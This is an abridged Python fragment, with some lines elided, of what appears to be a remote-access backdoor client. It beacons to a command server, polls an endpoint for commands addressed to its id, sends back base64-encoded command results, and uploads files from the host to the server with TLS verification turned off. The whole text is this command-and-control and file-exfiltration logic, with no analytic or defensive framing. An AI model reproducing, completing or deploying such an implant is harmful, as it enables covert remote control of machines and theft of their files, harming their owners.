...
hello = requests.get(url + "/ENDPOINT?MODE=res&RESPONSE=" + base64_message + "&id="+uid, verify=False)

while True:
	try:
		cmds = requests.get(url + "/ENDPOINT?MODE=cmds&id="+uid+"&o=P", verify=False)
		cmds = str(cmds.text)
		for lines in cmds.splitlines():
			if str(uid) in lines:
				...
				if act == "run":
					...
					gimme = requests.get(url + "/ENDPOINT?MODE=res&RESPONSE=" + resbase64 + "&id="+uid, verify=False)
				...
				if act == "download":
					...
					tellme = requests.get(url + "/ENDPOINT?MODE=res&RESPONSE=" + base64_messagedl + "&id="+uid, verify=False)
					gimme = requests.post(url + "/ENDPOINT?MODE=up&id="+uid, files=multipart_form_data , verify=False)
